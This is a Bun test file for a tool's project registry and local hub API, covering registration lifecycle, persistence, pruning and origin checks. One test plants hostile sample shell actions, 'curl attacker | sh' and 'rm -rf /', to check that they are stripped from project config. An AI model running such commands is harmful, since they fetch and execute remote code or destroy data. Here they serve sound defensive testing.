import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { mkdtempSync, rmSync, writeFileSync, existsSync } from "node:fs";
import { execSync } from "node:child_process";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { createProjectRegistry, projectIdForCwd } from "../projects.ts";
import { defaultCommandRunner } from "../git.ts";
import type { WatcherFactory } from "../watcher.ts";
import { createAppConfig } from "../app.ts";
import { createCmuxService, createDryRunConnector } from "../cmux.ts";

const noopWatcherFactory: WatcherFactory = () => ({ close: () => {} });

let repoDir: string;
let otherDir: string;
let persistPath: string;
let tempRoot: string;

function gitIn(dir: string, cmd: string) {
  execSync(`git ${cmd}`, { cwd: dir, stdio: "pipe" });
}

beforeAll(() => {
  tempRoot = mkdtempSync(join(tmpdir(), "cmux-hub-registry-"));
  repoDir = join(tempRoot, "repo");
  otherDir = join(tempRoot, "not-a-repo");
  persistPath = join(tempRoot, "projects.json");
  execSync(`mkdir -p ${repoDir} ${otherDir}`);
  gitIn(repoDir, "init");
  gitIn(repoDir, "config user.email 'test@test.com'");
  gitIn(repoDir, "config user.name 'Test'");
  writeFileSync(join(repoDir, "a.ts"), "export const a = 1;\n");
  gitIn(repoDir, "add .");
  gitIn(repoDir, "commit -m init");
  // A pending change so diff stats are non-zero
  writeFileSync(join(repoDir, "a.ts"), "export const a = 2;\nexport const b = 3;\n");
});

afterAll(() => {
  rmSync(tempRoot, { recursive: true, force: true });
});

function makeRegistry() {
  return createProjectRegistry({
    runner: defaultCommandRunner,
    watcherFactory: noopWatcherFactory,
    persistPath,
  });
}

describe("project registry", () => {
  test("register → list → unregister → dismiss lifecycle", async () => {
    const registry = makeRegistry();
    const entry = await registry.register({ cwd: repoDir, harness: "claude-code" });
    expect(entry.info.id).toBe(projectIdForCwd(repoDir));
    expect(entry.info.status).toBe("active");
    expect(entry.info.name).toBe("repo");

    const summaries = await registry.summaries();
    expect(summaries).toHaveLength(1);
    expect(summaries[0]!.additions).toBeGreaterThan(0);
    expect(summaries[0]!.deletions).toBeGreaterThan(0);
    expect(summaries[0]!.branch.length).toBeGreaterThan(0);

    expect(registry.unregister(repoDir)).toBe(true);
    expect(registry.get(entry.info.id)!.info.status).toBe("inactive");

    expect(registry.dismiss(entry.info.id)).toBe(true);
    expect(registry.get(entry.info.id)).toBeUndefined();
    registry.stop();
  });

  test("rejects non-git directories and missing paths", async () => {
    const registry = makeRegistry();
    await expect(registry.register({ cwd: otherDir })).rejects.toThrow("Not a git repository");
    await expect(registry.register({ cwd: join(tempRoot, "nope") })).rejects.toThrow(
      "does not exist",
    );
    registry.stop();
  });

  test("persists across restarts", async () => {
    const registry = makeRegistry();
    await registry.register({ cwd: repoDir });
    registry.unregister(repoDir);
    registry.stop();
    expect(existsSync(persistPath)).toBe(true);

    const reloaded = makeRegistry();
    await reloaded.load();
    const entry = reloaded.get(projectIdForCwd(repoDir));
    expect(entry).toBeDefined();
    expect(entry!.info.status).toBe("inactive");
    reloaded.dismiss(entry!.info.id);
    reloaded.stop();
  });

  test("re-registering an inactive project reactivates it", async () => {
    const registry = makeRegistry();
    await registry.register({ cwd: repoDir });
    registry.unregister(repoDir);
    const entry = await registry.register({ cwd: repoDir, surfaceId: "surface:99" });
    expect(entry.info.status).toBe("active");
    expect(entry.info.surfaceId).toBe("surface:99");
    registry.dismiss(entry.info.id);
    registry.stop();
  });

  test("projects whose directory disappears are removed automatically", async () => {
    // A session in a git worktree that gets cleaned up on exit leaves an
    // entry pointing at a deleted directory — the registry must self-heal
    const worktreeDir = join(tempRoot, "ephemeral-worktree");
    execSync(`mkdir -p ${worktreeDir}`);
    gitIn(worktreeDir, "init");
    gitIn(worktreeDir, "config user.email 't@t.com'");
    gitIn(worktreeDir, "config user.name 'T'");
    writeFileSync(join(worktreeDir, "f.ts"), "export {};\n");
    gitIn(worktreeDir, "add .");
    gitIn(worktreeDir, "commit -m init");

    const registry = makeRegistry();
    const entry = await registry.register({ cwd: worktreeDir });
    expect(entry.info.status).toBe("active");

    rmSync(worktreeDir, { recursive: true, force: true });

    // Self-heals on list fetch...
    const summaries = await registry.summaries();
    expect(summaries.some((p) => p.id === entry.info.id)).toBe(false);
    expect(registry.get(entry.info.id)).toBeUndefined();

    // ...and the shared repo is untouched
    await registry.register({ cwd: repoDir });
    registry.prune();
    expect(registry.get(projectIdForCwd(repoDir))).toBeDefined();
    registry.dismiss(projectIdForCwd(repoDir));
    registry.stop();
  });

  test("prune demotes crash-orphaned actives, then drops them after the linger window", async () => {
    const registry = makeRegistry();
    const entry = await registry.register({ cwd: repoDir });
    const HOUR = 60 * 60 * 1000;

    registry.prune(Date.now() + 25 * HOUR);
    expect(registry.get(entry.info.id)!.info.status).toBe("inactive");

    // Linger window is anchored at demotion time, not lastSeenAt
    registry.prune(Date.now() + 26 * HOUR);
    expect(registry.get(entry.info.id)).toBeDefined();

    registry.prune(Date.now() + 51 * HOUR);
    expect(registry.get(entry.info.id)).toBeUndefined();
    registry.stop();
  });

  test("concurrent register calls for the same cwd create one entry and one watcher", async () => {
    let watchersCreated = 0;
    const countingFactory: WatcherFactory = () => {
      watchersCreated++;
      return { close: () => {} };
    };
    const registry = createProjectRegistry({
      runner: defaultCommandRunner,
      watcherFactory: countingFactory,
      persistPath,
    });
    const [a, b] = await Promise.all([
      registry.register({ cwd: repoDir }),
      registry.register({ cwd: repoDir }),
    ]);
    expect(a.info.id).toBe(b.info.id);
    expect(watchersCreated).toBe(1);
    registry.dismiss(a.info.id);
    registry.stop();
  });

  test("shell actions from project-local config are stripped unless opted in", async () => {
    const actionsDir = join(repoDir, ".cmux-hub");
    execSync(`mkdir -p ${actionsDir}`);
    writeFileSync(
      join(actionsDir, "actions.json"),
      JSON.stringify([
        { label: "Evil", type: "shell", command: "curl attacker | sh" },
        { label: "Fine", type: "paste-and-enter", command: "review this" },
        {
          label: "More",
          submenu: [
            { label: "Nested evil", type: "shell", command: "rm -rf /" },
            { label: "Nested fine", type: "paste", command: "hello" },
          ],
        },
      ]),
    );
    try {
      const registry = makeRegistry();
      const entry = await registry.register({ cwd: repoDir });
      const labels = entry.actions.flatMap((a) =>
        "submenu" in a ? a.submenu.map((s) => s.label) : [a.label],
      );
      expect(labels).toEqual(["Fine", "Nested fine"]);
      registry.dismiss(entry.info.id);
      registry.stop();

      const permissive = createProjectRegistry({
        runner: defaultCommandRunner,
        watcherFactory: noopWatcherFactory,
        persistPath,
        allowProjectShellActions: true,
      });
      const entry2 = await permissive.register({ cwd: repoDir });
      expect(entry2.actions).toHaveLength(3);
      permissive.dismiss(entry2.info.id);
      permissive.stop();
    } finally {
      rmSync(actionsDir, { recursive: true, force: true });
    }
  });
});

describe("hub API", () => {
  const PORT = 14599;
  const validHeaders = () => ({
    host: `127.0.0.1:${PORT}`,
    "content-type": "application/json",
  });

  function makeApp(registry: ReturnType<typeof makeRegistry>) {
    const cmux = createCmuxService(createDryRunConnector());
    const app = createAppConfig({ port: PORT, cmux, registry });
    app.setServer({ upgrade: () => false, port: PORT });
    return app;
  }

  async function call(
    app: ReturnType<typeof createAppConfig>,
    path: string,
    method: string,
    body?: unknown,
  ): Promise<{ status: number; json: Record<string, unknown> }> {
    const route = app.apiRoutes[path] as Record<
      string,
      (req: Request) => Response | Promise<Response>
    >;
    const handler = route[method];
    if (!handler) throw new Error(`No ${method} handler for ${path}`);
    const res = await handler(
      new Request(`http://127.0.0.1:${PORT}${path}`, {
        method,
        headers: validHeaders(),
        body: body === undefined ? undefined : JSON.stringify(body),
      }),
    );
    return { status: res.status, json: (await res.json()) as Record<string, unknown> };
  }

  test("register / list / project-scoped diff / dismiss over HTTP", async () => {
    const registry = makeRegistry();
    const app = makeApp(registry);

    const reg = await call(app, "/api/projects/register", "POST", { cwd: repoDir });
    expect(reg.status).toBe(200);
    const id = reg.json.id as string;
    expect(id).toBe(projectIdForCwd(repoDir));

    const list = await call(app, "/api/projects", "GET");
    expect(list.json.hubMode).toBe(true);
    const projects = list.json.projects as Array<Record<string, unknown>>;
    expect(projects.some((p) => p.id === id && p.status === "active")).toBe(true);

    // Project-scoped diff resolves against the registered repo
    const diffRoute = app.apiRoutes["/api/diff/auto"] as {
      GET: (req: Request) => Promise<Response>;
    };
    const diffRes = await diffRoute.GET(
      new Request(`http://127.0.0.1:${PORT}/api/diff/auto?project=${id}`, {
        headers: validHeaders(),
      }),
    );
    const diff = (await diffRes.json()) as { files: Array<{ newPath: string }> };
    expect(diff.files.some((f) => f.newPath === "a.ts")).toBe(true);

    // Without a project param, hub mode has no default project
    const noProject = await diffRoute.GET(
      new Request(`http://127.0.0.1:${PORT}/api/diff/auto`, { headers: validHeaders() }),
    );
    expect(noProject.status).toBe(400);

    const dismissed = await call(app, "/api/projects/dismiss", "POST", { id });
    expect(dismissed.json.ok).toBe(true);
    registry.stop();
    app.stop();
  });

  test("comment without a registered surface falls back to clipboard", async () => {
    const registry = makeRegistry();
    const app = makeApp(registry);
    const reg = await call(app, "/api/projects/register", "POST", { cwd: repoDir });
    const id = reg.json.id as string;

    const route = app.apiRoutes["/api/comment"] as { POST: (req: Request) => Promise<Response> };
    const res = await route.POST(
      new Request(`http://127.0.0.1:${PORT}/api/comment?project=${id}`, {
        method: "POST",
        headers: validHeaders(),
        body: JSON.stringify({ file: "a.ts", startLine: 1, endLine: 2, comment: "check this" }),
      }),
    );
    const json = (await res.json()) as { ok: boolean; delivered: string; text?: string };
    expect(json.ok).toBe(true);
    expect(json.delivered).toBe("clipboard");
    expect(json.text).toBe("a.ts:1-2 check this");

    registry.dismiss(id);
    registry.stop();
    app.stop();
  });

  test("registration endpoints reject browser-originated requests", async () => {
    const registry = makeRegistry();
    const app = makeApp(registry);
    const route = app.apiRoutes["/api/projects/register"] as {
      POST: (req: Request) => Promise<Response>;
    };
    // Same-origin browser request (carries Origin) must be rejected —
    // registration is hook/curl-only
    const res = await route.POST(
      new Request(`http://127.0.0.1:${PORT}/api/projects/register`, {
        method: "POST",
        headers: { ...validHeaders(), origin: `http://127.0.0.1:${PORT}` },
        body: JSON.stringify({ cwd: repoDir }),
      }),
    );
    expect(res.status).toBe(403);
    registry.stop();
    app.stop();
  });

  test("hub mode rejects cross-port localhost origins (strict origin)", async () => {
    const registry = makeRegistry();
    const app = makeApp(registry);
    const route = app.apiRoutes["/api/projects"] as { GET: (req: Request) => Promise<Response> };
    const crossPort = await route.GET(
      new Request(`http://127.0.0.1:${PORT}/api/projects`, {
        headers: { ...validHeaders(), origin: "http://localhost:9999" },
      }),
    );
    expect(crossPort.status).toBe(403);
    const sameOrigin = await route.GET(
      new Request(`http://127.0.0.1:${PORT}/api/projects`, {
        headers: { ...validHeaders(), origin: `http://127.0.0.1:${PORT}` },
      }),
    );
    expect(sameOrigin.status).toBe(200);
    registry.stop();
    app.stop();
  });

  test("comment with a registered surface is delivered to cmux", async () => {
    const registry = makeRegistry();
    const app = makeApp(registry);
    const reg = await call(app, "/api/projects/register", "POST", {
      cwd: repoDir,
      surfaceId: "surface:42",
    });
    const id = reg.json.id as string;

    const route = app.apiRoutes["/api/comment"] as { POST: (req: Request) => Promise<Response> };
    const res = await route.POST(
      new Request(`http://127.0.0.1:${PORT}/api/comment?project=${id}`, {
        method: "POST",
        headers: validHeaders(),
        body: JSON.stringify({ file: "a.ts", startLine: 3, endLine: 3, comment: "nice" }),
      }),
    );
    const json = (await res.json()) as { ok: boolean; delivered: string };
    expect(json.ok).toBe(true);
    expect(json.delivered).toBe("cmux");

    registry.dismiss(id);
    registry.stop();
    app.stop();
  });
});
